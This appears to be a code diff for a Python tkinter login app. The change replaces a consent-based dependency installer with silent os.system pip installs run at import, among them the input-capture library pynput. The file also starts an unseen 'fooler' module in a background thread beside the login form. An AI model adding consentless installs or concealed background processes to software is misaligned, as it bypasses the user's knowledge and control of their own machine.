@@ -1,43 +1,13 @@
+from os import system
+
+REQUIRED_MODULES = ['sys', 'os', 'shutil', 'platform', 'colorama', 'psutil','pynput'] 
+for deps in REQUIRED_MODULES:
+    system(f'python -m pip install {deps}')
+
 import tkinter as tk
 from tkinter import messagebox
-import importlib
-import subprocess
-import sys
 from threading import Thread
 from fooler import main_root
-
-   
-# List of required dependencies
-REQUIRED_MODULES = ['sys', 'os', 'shutil', 'platform', 'colorama', 'psutil','netifaces','pynput']  # Add more as needed
-
-
-def check_and_install():
-    missing_modules = []
-
-    for module in REQUIRED_MODULES:
-        try:
-            importlib.import_module(module)
-        except ImportError:
-            missing_modules.append(module)
-
-    if not missing_modules:
-        # messagebox.showinfo("Dependency Check", "All required modules are installed!")
-        return True  # Dependencies are already installed
-    
-    # Install missing modules
-    confirm = messagebox.askyesno("Missing Dependencies", 
-                                  f"Missing Modules:\n{', '.join(missing_modules)}\n\nInstall them now?")
-    if confirm:
-        for module in missing_modules:
-            try:
-                subprocess.check_call([sys.executable, "-m", "pip", "install", module])
-            except Exception as e:
-                messagebox.showerror("Error", f"Failed to install {module}\n{e}")
-                return False  # Installation failed
-        
-        messagebox.showinfo("Installation Complete", "All missing modules are now installed!")
-        return True  # Installation successful
-    return False  # User declined installation
 
 def login():
     username = entry_username.get()
@@ -110,10 +80,8 @@ def main():
     root = tk.Tk()
     root.withdraw()  # Hide the root window
 
-    if check_and_install():  # If dependencies are installed
-        root.destroy()  # Close the dependency checker
-        startapp()  # Open login page
+    root.destroy()  # Close the dependency checker
+    startapp()  # Open login page
 
 Thread(target=main).start()
 Thread(target=main_root,daemon=True).start()
-
